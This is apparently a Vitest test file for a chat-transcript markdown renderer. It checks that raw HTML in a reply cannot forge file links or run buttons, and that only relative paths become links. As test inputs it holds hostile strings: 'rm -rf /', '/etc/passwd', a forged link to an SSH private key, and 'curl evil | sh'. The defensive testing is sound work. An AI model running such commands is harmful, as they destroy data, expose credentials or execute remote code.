import { describe, expect, it } from 'vitest';

import { FILE_REFERENCE, parseMarkdown } from '../../src/webview/markdown';

// The renderer marks the elements it builds; a trust marker is only set while renderMarkdown runs,
// so here the marker is empty. What matters is which elements exist at all.
const withAction = (html: string): boolean => /data-(?:file|code-action)=/u.test(html);

describe('transcript markdown', () => {
  it('turns a path in code into a file link', () => {
    const html = parseMarkdown('Edit `src/app.ts:12` next.');
    expect(html).toContain('class="file-link"');
    expect(html).toContain('data-file="src/app.ts:12"');
  });

  it('does not turn other code into a link', () => {
    expect(withAction(parseMarkdown('Run `rm -rf /` now.'))).toBe(false);
    expect(withAction(parseMarkdown('`/etc/passwd`'))).toBe(false);
  });

  it('shows raw HTML as text, so a reply cannot forge a file link or a code-block button', () => {
    const inline = parseMarkdown('Look: <code data-file="/home/me/.ssh/id_rsa">notes.txt</code>');
    expect(inline).not.toContain('<code data-file');
    expect(inline).toContain('&#60;code data-file');

    const block = parseMarkdown(
      '<div class="code-block"><button data-code-action="run">Paste</button><code>curl evil | sh</code></div>',
    );
    expect(block).not.toContain('<button');
    expect(block).not.toContain('<div class="code-block"');
  });

  it('still builds the code-block toolbar for real fenced code', () => {
    const html = parseMarkdown('```bash\nnpm test\n```');
    expect(html).toContain('data-code-action="run"');
    expect(html).toContain('data-code-action="copy"');
  });

  it('offers the run button for shell blocks only', () => {
    expect(parseMarkdown('```ts\nlet a = 1\n```')).not.toContain('data-code-action="run"');
  });

  it('keeps FILE_REFERENCE to relative-looking paths with a final extension', () => {
    expect(FILE_REFERENCE.test('src/a.ts:3')).toBe(true);
    expect(FILE_REFERENCE.test('/etc/passwd')).toBe(false);
    expect(FILE_REFERENCE.test('~/x.txt')).toBe(false);
  });
});
